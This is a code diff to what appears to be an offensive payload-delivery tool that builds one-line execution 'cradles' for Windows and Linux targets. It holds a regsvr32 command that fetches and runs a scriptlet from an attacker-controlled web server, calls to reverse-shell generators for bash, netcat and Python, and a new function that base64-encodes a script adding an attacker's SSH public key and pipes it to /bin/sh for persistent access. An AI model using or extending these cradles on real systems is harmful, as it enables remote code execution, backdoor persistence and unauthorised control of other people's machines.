@@ -83,9 +83,20 @@ def regsvr32(all_shells):
 			path_to_payload = write_cradle_shell(sct_filename,content)
 			execution = 'regsvr32 /s /n /u /i:http://%s:%s/%s scrobj.dll' % (args.ip_address,args.web_delivery,path_to_payload)
 			os = 'Windows'
-			cradle = Cradle(name,payload,execution, os)
+			cradle = Cradle(name, payload, execution, os)
 			cradles.append(cradle)
 	return cradles
+
+def add_ssh_key_sh(all_shells):
+	for shell in all_shells:
+		if shell.type == 'Add SSH Key':
+			name = 'Add SSH Key: Linux'
+			raw_payload = shell.content.replace('TEMPLATEPAYLOAD',shell.additional.public) # read shell script in
+			payload = base64.b64encode(raw_payload.encode('utf-8')).decode('utf-8') # hate how its encode and then decode
+			execution = 'echo "%s"|base64 -d|/bin/sh' % payload
+			os = 'Linux'
+			cradle = Cradle(name, payload, execution, os)
+			return cradle
 
 def bash_reverse():
 	name = 'Bash Reverse TCP'
@@ -119,6 +130,7 @@ def python_reverse():
 	cradle = Cradle(name,payload,execution, os)
 	return cradle
 
+
 def generate_all_cradles(all_shells):
 	# each of these are lists of cradles; cradle for each shell. one for bind, one for reverse etc etc.
 	if args.operating_system == None:
@@ -126,17 +138,20 @@ def generate_all_cradles(all_shells):
 		powershell_IEX_b64_cradles = powershell_IEX_b64(all_shells)
 		powershell_IEX_gzip_cradles = powershell_IEX_gzip(all_shells)
 		regsvr32_cradles = regsvr32(all_shells)
-		linux_cradles = [bash_reverse(),netcat_reverse(),netcat_reverse_openbsd(),python_reverse()]
+		linux_cradles = [bash_reverse(),netcat_reverse(),netcat_reverse_openbsd(),python_reverse(),add_ssh_key_sh(all_shells)]
 		cradles = powershell_IEX_raw_cradles + powershell_IEX_b64_cradles + powershell_IEX_gzip_cradles + regsvr32_cradles + linux_cradles
+
 	elif "windows" in args.operating_system.lower():
 		powershell_IEX_raw_cradles = powershell_IEX_raw(all_shells)
 		powershell_IEX_b64_cradles = powershell_IEX_b64(all_shells)
 		powershell_IEX_gzip_cradles = powershell_IEX_gzip(all_shells)
 		regsvr32_cradles = regsvr32(all_shells)
 		cradles = powershell_IEX_raw_cradles + powershell_IEX_b64_cradles + powershell_IEX_gzip_cradles + regsvr32_cradles
+
 	elif "linux" in args.operating_system.lower():
-		linux_cradles = [bash_reverse(),netcat_reverse(),netcat_reverse_openbsd(),python_reverse()]
+		linux_cradles = [bash_reverse(),netcat_reverse(),netcat_reverse_openbsd(),python_reverse(),add_ssh_key_sh(all_shells)]
 		cradles = linux_cradles
+		
 	else:
 		logger.red.fg("Unknown OS type. Please specify %s or %s!" % (logger.red_fg('Linux'),logger.red_fg('Windows')))
 		quit()
